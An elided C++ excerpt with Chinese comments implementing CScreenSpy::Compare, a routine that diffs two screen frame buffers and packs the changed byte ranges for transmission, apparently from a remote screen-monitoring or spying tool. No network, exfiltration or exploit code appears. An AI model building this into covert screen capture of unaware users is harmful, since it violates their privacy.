...
int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize )
{
	...
	// 偏移的偏移，不同长度的偏移
	UINT	nOffsetOffset = 0, nBytesOffset = 0, nDataOffset = 0;
	UINT nCount = 0; // 数据计数器
	// p1++实际上是递增了一个DWORD
	UINT nStartOffest = 0;
	UINT nEndOffest = 0;
	...
	for (UINT i = 0; i < dwSize; )
	{
		...
		nStartOffest = (LPBYTE)p2 - lpSource;
		*(LPDWORD)(lpBuffer + nOffsetOffset) = nStartOffest;
		nBytesOffset = nOffsetOffset + sizeof(int);
		nDataOffset = nBytesOffset + sizeof(int);
		int nSetp = 0;
		UINT j = 0;
PROCESS_DIFF:
		if (i + 20*sizeof(DWORD) < dwSize)
		{

			nSetp = sizeof(DWORD)*20;
			p1+=20;
			p2+=20;
		}
		else
		{
			nSetp = dwSize - 1 -i;
			p1 += nSetp/sizeof(DWORD);
			p2 += nSetp/sizeof(DWORD);
		}
		p3 = p1;
		p4 = p2;
		i += nSetp;
...
// 		for (UINT j = i;j < dwSize;j += 4, i += 4, p1++, p2++)
// 		{
// 			if (*p1 == *p2)
// 				break;
// 		}
		nCount = (LPBYTE)p4 - lpSource - nStartOffest + 4;	
		memcpy(lpDest + nStartOffest,lpSource + nStartOffest,nCount);
		memcpy(lpBuffer + nBytesOffset,&nCount,sizeof(nCount));
		memcpy(lpBuffer + nDataOffset,lpSource + nStartOffest,nCount);
